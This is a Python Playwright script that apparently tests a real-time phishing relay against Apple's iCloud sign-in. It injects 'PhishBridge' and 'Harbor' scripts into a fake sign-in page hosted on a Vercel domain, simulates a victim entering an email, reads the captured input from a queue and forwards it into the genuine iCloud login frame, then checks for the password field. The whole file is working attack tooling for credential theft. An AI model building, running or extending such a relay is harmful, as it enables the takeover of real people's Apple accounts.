import sys
sys.path.insert(0, '.')
from phish_mirror import (
    open_icloud_sign_in, apple_auth_frame, forward_email,
    PHISH_BRIDGE, HARBOR_DRIVER,
)
from playwright.sync_api import sync_playwright

EMAIL = 'phish-test-notreal@example.com'

with sync_playwright() as p:
    b = p.chromium.launch(channel='chromium', headless=True)
    vctx = b.new_context()
    vctx.add_init_script(PHISH_BRIDGE)
    vctx.add_init_script(HARBOR_DRIVER)
    victim = vctx.new_page()

    mctx = b.new_context()
    apple = mctx.new_page()
    frame = open_icloud_sign_in(apple)
    print('icloud frame found:', bool(apple_auth_frame(apple)))

    victim.goto('https://harbor-ten-lake.vercel.app/signin', wait_until='domcontentloaded', timeout=60000)
    victim.wait_for_timeout(300)

    # Simulate the victim typing the email and clicking Continue.
    victim.fill('#account', EMAIL)
    victim.wait_for_timeout(150)
    victim.click('#continue-btn')
    victim.wait_for_timeout(400)

    q = victim.evaluate('() => window.PhishBridge ? window.PhishBridge.queue() : []')
    print('victim queue:', q)

    if q and q[0].get('type') == 'submit':
        forward_email(apple, apple_auth_frame(apple) or frame, q[0]['payload']['account'])
        apple.wait_for_timeout(2500)

    frame = apple_auth_frame(apple) or frame
    if frame:
        try:
            val = frame.locator('#account_name_text_field').input_value()
            print('icloud email field now:', repr(val))
            print('icloud password field visible:', frame.locator('#password_text_field').count())
        except Exception as e:
            print('probe err:', e)
    b.close()
